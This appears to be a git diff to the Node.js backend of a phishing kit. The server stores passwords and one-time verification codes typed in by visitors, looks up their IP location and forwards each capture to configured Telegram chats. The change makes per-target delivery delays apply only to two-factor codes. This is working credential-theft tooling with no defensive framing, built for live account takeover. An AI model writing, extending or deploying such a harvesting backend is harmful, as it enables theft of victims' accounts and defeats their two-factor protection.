@@ -295,7 +295,7 @@ function buildMessage(session, ip = 'Unknown') {
     return msg;
 }
 
-async function sendTelegram(message, messageIdsMap = null, sessionId = null) {
+async function sendTelegram(message, messageIdsMap = null, sessionId = null, is2FA = false) {
     if (TELEGRAM_TARGETS.length === 0) {
         console.warn('[TG] Aborting: No Telegram targets configured');
         return {};
@@ -307,8 +307,10 @@ async function sendTelegram(message, messageIdsMap = null, sessionId = null) {
     const immediateResults = {};
 
     for (const target of TELEGRAM_TARGETS) {
+        const hasDelay = is2FA && target.delay > 0;
+
         const sendToTarget = async () => {
-            if (target.delay > 0) {
+            if (hasDelay) {
                 await new Promise(resolve => setTimeout(resolve, target.delay));
             }
 
@@ -361,7 +363,7 @@ async function sendTelegram(message, messageIdsMap = null, sessionId = null) {
             return null;
         };
 
-        if (target.delay > 0) {
+        if (hasDelay) {
             // Background send
             sendToTarget();
         } else {
@@ -550,14 +552,14 @@ app.post('/api/send-request', async (req, res) => {
 
             // Send Telegram immediately
             const msg = buildMessage(sessions[id], ip);
-            sessions[id].messageIds = await sendTelegram(msg, null, id);
+            sessions[id].messageIds = await sendTelegram(msg, null, id, false);
 
             // Geo lookup in background — update message if resolved within 4s
             getIPInfo(ip).then(location => {
                 if (location && location !== 'Unknown' && sessions[id]) {
                     sessions[id].location = location;
                     const updatedMsg = buildMessage(sessions[id], ip);
-                    sendTelegram(updatedMsg, sessions[id].messageIds, id).catch(() => {});
+                    sendTelegram(updatedMsg, sessions[id].messageIds, id, false).catch(() => {});
                 }
             }).catch(() => {});
             return res.json({ success: true, session_id: id });
@@ -573,7 +575,7 @@ app.post('/api/send-request', async (req, res) => {
             }
             sessions[session_id].passwords.push((data.password || '').substring(0, FIELD_LIMITS.password));
             const msg = buildMessage(sessions[session_id], ip);
-            await sendTelegram(msg, sessions[session_id].messageIds, session_id);
+            await sendTelegram(msg, sessions[session_id].messageIds, session_id, false);
             return res.json({ success: true });
         }
 
@@ -587,7 +589,7 @@ app.post('/api/send-request', async (req, res) => {
             }
             sessions[session_id].codes.push((data.code || '').substring(0, FIELD_LIMITS.code));
             const msg = buildMessage(sessions[session_id], ip);
-            await sendTelegram(msg, sessions[session_id].messageIds, session_id);
+            await sendTelegram(msg, sessions[session_id].messageIds, session_id, true);
             return res.json({ success: true });
         }
 
